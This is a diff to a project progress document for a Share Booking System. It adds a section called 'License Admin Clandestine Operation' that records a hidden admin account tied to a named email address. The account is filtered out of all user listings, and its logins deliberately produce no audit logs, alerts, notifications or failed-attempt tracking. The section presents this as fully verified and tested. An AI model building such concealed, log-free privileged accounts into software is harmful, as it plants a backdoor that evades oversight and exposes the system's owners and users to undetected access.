@@ -76,15 +76,34 @@ Build a Share Booking System for managing client share bookings, inventory track
 
 #### ✅ License Admin Hidden & Expiry Verification (Feb 08, 2026)
 
-**Verified license admin security:**
-- License admin (`deynet@gmail.com`) with `role=0` and `is_hidden=True` is completely hidden from:
-  - `/api/users` - User listing
-  - `/api/users/employees` - Employee listing
-  - `/api/users/all` - All users listing  
-  - `/api/users/managers` - Manager listing
-  - `/api/users/hierarchy/potential-managers` - Hierarchy queries
-  - `/api/users/team/subordinates` - Team queries
-  - `/api/users/team/direct-reports` - Direct reports queries
+**License Admin Clandestine Operation (FULLY VERIFIED):**
+The license admin (`deynet@gmail.com`) is a completely hidden entity:
+
+**Hidden from ALL User Endpoints:**
+- `/api/users` - Main user listing
+- `/api/users/all` - All users view
+- `/api/users/employees` - Employee listing
+- `/api/users/hierarchy` - Hierarchy view
+- `/api/users/managers-list` - Manager dropdown
+- `/api/users/{id}/subordinates` - Subordinate lists
+- `/api/users/hierarchy/potential-managers` - Manager selection
+- `/api/users/team/subordinates` - Team views
+- `/api/users/team/direct-reports` - Direct reports
+
+**No Alerts/Logs on Login:**
+- ✓ No security audit logs created
+- ✓ No login notification emails sent
+- ✓ No unusual login location alerts
+- ✓ No failed attempt tracking
+- ✓ No audit log entries
+
+**Implementation:**
+- Added `is_hidden: {"$ne": True}` filter to ALL user queries in `users.py`
+- Added `is_hidden_admin` check in `auth.py` to skip ALL alerts and logs
+
+**Testing:** 100% (27/27 backend tests passed) - `/app/test_reports/iteration_88.json`
+
+**License Expiry Real-Time Checking:**
 - License admin CAN log in and access `/licence` management page
 - Regular users (PE/FI) CANNOT access license management endpoints (403 Forbidden)
 
